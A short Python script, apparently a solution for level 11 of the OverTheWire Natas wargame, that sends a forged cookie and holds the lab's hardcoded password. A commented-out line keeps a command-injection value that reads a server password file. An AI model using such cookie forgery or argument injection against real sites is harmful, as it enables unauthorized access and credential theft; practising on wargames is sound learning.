#! /usr/bin/env python3.6
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
# Copyright 2020 leaundre leaundre.jackson87@gmail.com
#
# Distributed under terms of the %LICENSE% license.

"""
A script to use in Natas Wargame room in OvertheWire
"""

from urllib.parse import unquote
import re
import base64
import requests

username = 'natas11'
password = 'U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK'

url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()
# response = session.get(url, auth=(username, password))
# response = session.post(url, data={"needle": ". /etc/natas_webpass/natas11 #",
#                               "submit": "submit"}, auth=(username, password))

cookies = {"data" : "ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK"}

response = session.get(url, auth = (username, password), cookies = cookies)

content = response.text
print(content)

# print(re.findall('<pre>\n(.*)\n</pre>', content)[0])
# print(base64.b64decode((unquote(session.cookies['data']))).hex())
